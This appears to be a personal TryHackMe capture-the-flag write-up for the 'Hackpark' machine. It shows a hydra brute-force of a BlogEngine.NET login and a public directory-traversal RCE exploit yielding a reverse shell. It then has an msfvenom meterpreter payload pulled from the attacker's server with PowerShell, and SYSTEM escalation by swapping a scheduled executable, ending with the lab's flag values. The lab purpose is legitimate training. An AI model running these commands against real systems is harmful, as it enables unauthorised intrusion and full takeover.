# Hackpark writeup
#pentest/tryhackme

We might have a user called admin. Can we find out their password using hydra?

First we need to set the proper placeholders in hydra. To do that we need to fetch the params that a form sends to the backend during the form submission.
To do that we can inspect a request in the browser and copy the params sent or use **burpsuite**, which is the easier way since everything is already URI encoded. 

```
__VIEWSTATE=sWJi%2BdMypRv71LwD%2F9gXl2L8IpgKwZ2%2B6MofLb%2FmAdco99zAYYas6uCzgQyqzKBne7sRgoJ9qIgiE7RLxaV3zEdaPH%2FztLdyquxXZderx%2BSlU%2BFerFlKcItbpGjvJ0fl4bQYEluiphNCAA4P%2BIqOlkElTybzDSTsuDwcchIhtQ1n7g%2Be15%2FLQqX8ETlQuUIGyFPtmi7xgvh0Ee3beGPhzEMcCYXbUm2sv3%2F6ZJUDamL0G6EAPVHCVToW%2BlEhO6n4ylp0jDoFpWDNoMnPJtxw9mquke%2FXLJ2WyV2s4iXdEBRcLhq9y3ldu92DSsHXe%2FyQC3lRjZlZEIAeIyEyno96KQt3MiyECICxU92b0ssdrVwS5w%2B0&__EVENTVALIDATION=u5wEm%2BGBspPtNUVxPasVfRL7S98lhvSzFf3SXTrg%2BnDvlSLQJY36AxIRhkuLjm8TooKerwOjaJGfJOYFR%2F%2F8bTcsJ%2FsSaZtJjWQLQht51g7oxLa6tnEYZk3BKIMMdQBV2EUnoJOwtoHrmQ16Sz55zN2IbwbcVI5i0xMM%2FS75MVn2HF32&ctl00%24MainContent%24LoginUser%24UserName=pennywise&ctl00%24MainContent%24LoginUser%24Password=nicole&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in
```

Let’s set the placeholders now. We need to set **^USER^** for the field where we send the username, **^PASS^** for the field where we send the password and for the login button we need to set the state returned by the server if the login is invalid, which in this case is **“Login failed”**

```
__VIEWSTATE=sWJi%2BdMypRv71LwD%2F9gXl2L8IpgKwZ2%2B6MofLb%2FmAdco99zAYYas6uCzgQyqzKBne7sRgoJ9qIgiE7RLxaV3zEdaPH%2FztLdyquxXZderx%2BSlU%2BFerFlKcItbpGjvJ0fl4bQYEluiphNCAA4P%2BIqOlkElTybzDSTsuDwcchIhtQ1n7g%2Be15%2FLQqX8ETlQuUIGyFPtmi7xgvh0Ee3beGPhzEMcCYXbUm2sv3%2F6ZJUDamL0G6EAPVHCVToW%2BlEhO6n4ylp0jDoFpWDNoMnPJtxw9mquke%2FXLJ2WyV2s4iXdEBRcLhq9y3ldu92DSsHXe%2FyQC3lRjZlZEIAeIyEyno96KQt3MiyECICxU92b0ssdrVwS5w%2B0&__EVENTVALIDATION=u5wEm%2BGBspPtNUVxPasVfRL7S98lhvSzFf3SXTrg%2BnDvlSLQJY36AxIRhkuLjm8TooKerwOjaJGfJOYFR%2F%2F8bTcsJ%2FsSaZtJjWQLQht51g7oxLa6tnEYZk3BKIMMdQBV2EUnoJOwtoHrmQ16Sz55zN2IbwbcVI5i0xMM%2FS75MVn2HF32&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed
```

And putting everything together:

```shell
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.187.105 http-post-form "/Account/login.aspx:__VIEWSTATE=sWJi%2BdMypRv71LwD%2F9gXl2L8IpgKwZ2%2B6MofLb%2FmAdco99zAYYas6uCzgQyqzKBne7sRgoJ9qIgiE7RLxaV3zEdaPH%2FztLdyquxXZderx%2BSlU%2BFerFlKcItbpGjvJ0fl4bQYEluiphNCAA4P%2BIqOlkElTybzDSTsuDwcchIhtQ1n7g%2Be15%2FLQqX8ETlQuUIGyFPtmi7xgvh0Ee3beGPhzEMcCYXbUm2sv3%2F6ZJUDamL0G6EAPVHCVToW%2BlEhO6n4ylp0jDoFpWDNoMnPJtxw9mquke%2FXLJ2WyV2s4iXdEBRcLhq9y3ldu92DSsHXe%2FyQC3lRjZlZEIAeIyEyno96KQt3MiyECICxU92b0ssdrVwS5w%2B0&__EVENTVALIDATION=u5wEm%2BGBspPtNUVxPasVfRL7S98lhvSzFf3SXTrg%2BnDvlSLQJY36AxIRhkuLjm8TooKerwOjaJGfJOYFR%2F%2F8bTcsJ%2FsSaZtJjWQLQht51g7oxLa6tnEYZk3BKIMMdQBV2EUnoJOwtoHrmQ16Sz55zN2IbwbcVI5i0xMM%2FS75MVn2HF32&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed"
...
[80][http-post-form] host: 10.10.187.105   login: admin   password: 1qaz2wsx
```

Nice, let’s login!

Cool, so we see they are using BlogEngine version 3.3.6.0, can we find an exploit for it?

```shell
kali@kali:~/local_server$ searchsploit "BlogEngine"
------------------------------------------------------------------------------------------------------------------------------ 
 Exploit Title                                                                                        |  Path
------------------------------------------------------------------------------------------------------------------------------ 
...
BlogEngine.NET 3.3.6 - Directory Traversal / Remote Code Execution                                    | aspx/webapps/46353.cs
...
------------------------------------------------------------------------------------------------------------------------------ 
Shellcodes: No Results

```

The exploit with the CVE can be found here: [BlogEngine.NET 3.3.6 - Directory Traversal / Remote Code Execution - ASPX webapps Exploit](https://www.exploit-db.com/exploits/46353)

Let’s leverage this. Start by downloading the script and changing it to contain your IP and port from your netcat listener.

```shell
kali@kali:~$ wget https://www.exploit-db.com/raw/46353 
--2020-06-23 18:00:32--  https://www.exploit-db.com/raw/46353
...
2020-06-23 18:00:32 (37.4 MB/s) - ‘46353’ saved [3502/3502]

kali@kali:~$ mv 46353 PostView.ascx

# Edit your IP and Post
kali@kali:~$ vim PostView.ascx
```

Now we need to start out netcat listener in another tab

```shell
kali@kali:~$ nc -nlvp 1234 # port you defined in your PostView.ascx script
```

Following the instructions from the script, we:

1. Edit an existing post and upload our file to this post
2. Save the file 
3. Visit `http://<machine-ip>/?theme=../../App_Data/files`
4. And we get our reverse shell!!!!

```shell
kali@kali:~$ nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.2.13.100] from (UNKNOWN) [10.10.211.173] 49232
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.
whoami
c:\windows\system32\inetsrv>whoami
iis apppool\blog
```

Now that we have our reverse shell lets upgrade it to a full reverse shell. To best do that, lets use MSF again. Using msfvenom we can quickly create reverse handlers with hosts and ports baked in. To do that:

` msfvenom -p windows/meterpreter/reverse_tcp LHOST=[vpnIP] LPORT=[LPORT] -f exe > cool.exe`

Sweet, now we need to do a few things.

1. Create a python server to host our msfvenom payload

```shell
python3 -m http.server
```

2. Make the windows machine download this file onto C:\Windows\temp

```shell
# Our IP and the Python server port
powershell -c "Invoke-WebRequest -Uri 'http://10.2.13.100:8000/cool.exe' -OutFile 'C:\Windows\Temp\cool.exe'

# We should see something like this in our python server
10.10.211.173 - - [23/Jun/2020 18:28:29] "GET /cool.exe HTTP/1.1" 200 -
```

3. Time to start a reverse handler through metasploit!

```shell
$ msfconsole
msf5 > use exploit/multi/handler
msf5 > set PAYLOAD windows/meterpreter/reverse_tcp
msf5 > set LHOST tun0 # or our IP
msf5 > set LPORT 7777 # Port we specified on our msfvenom payload
msf5 > run
[*] Started reverse TCP handler on 10.2.13.100:7777
```

4. Back to the windows machine, let’s run our payload!

```shel
C:\Windows\Temp\cool.exe
```

5. And we should have a meterpreter session!

```shell
[*] Sending stage (176195 bytes) to 10.10.211.173
[*] Meterpreter session 1 opened (10.2.13.100:7777 -> 10.10.211.173:49364) at 2020-06-23 18:30:42 -0400

meterpreter >
```

**Privilege escalation time!**

Let’s download our great script [privilege-escalation-awesome-scripts-suite/winPEAS/winPEASbat at master · carlospolop/privilege-escalation-awesome-scripts-suite · GitHub](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASbat)

This script is a cool .bat that runs a scan through the machine looking for vulnerabilities. We can download it on our machine and upload it to the windows machine.
Again, we need to have our **Python Server running**.

```shell
powershell -c "Invoke-WebRequest -Uri 'http://10.2.13.100:8000/winPEAS.bat' -OutFile 'C:\Windows\Temp\winPEAS.bat'
# OR
upload winPEAS.bat # from your meterpreter shell
```

And now we run it:

```shell
C:\Windows\Temp\winPEAS.bat
# long long output
```

## So how do we go from here?

### WService, the WindowsScheduler
The first thing we look for is the processes running on the machine. Especially if we can find something called `WService.exe` which is the `WindowsScheduler`.
Now we know that we can something akin to cron jobs in Linux and we can figure out if we can exploit these scheduled jobs.

The path for this scheduler sits in: `C:/Program Files (x86)/SystemScheduler`, listing the files will show us potential things that are running periodically.
But how to be sure? Enter **Events**, that’s the diretory where our **log files** sit.

```shell
meterpreter > ls C:/Program Files (x86)/SystemScheduler/Events
...
20198415519.INI_LOG.txt # That's the one we are interested in

meterpreter > cat C:/Program Files (x86)/SystemScheduler/Events/20198415519.INI_LOG.txt
...
# many many Message.exe logs
# can we exploit it?
...
```

1. Let’s rename our Message.exe to Message.bak
2. Let’s rename our msfvenom to Message.exe and put it there
3. Wait a few seconds and we get a new meterpreter session
`powershell -c "Invoke-WebRequest -Uri 'http://10.2.13.100:8000/cool.exe' -OutFile "C:/'Program Files (x86)'/SystemScheduler/Message.exe"`
powershell -c "Invoke-WebRequest -Uri 'http://10.2.13.100:8000/cool.exe' -OutFile ‘C:/‘Program Files (x86)/SystemScheduler'

```shell
meterpreter > whoami
SYSTEM # wooooot

meterpreter > cat C:/Users/jeff/Desktop/user.txt
759bd8af507517bcfaede78a21a73e39

meterpreter > cat C:/Users/Administrator/Desktop/root.txt
7e13d97f05f7ceb9881a3eb3d78d3e72
```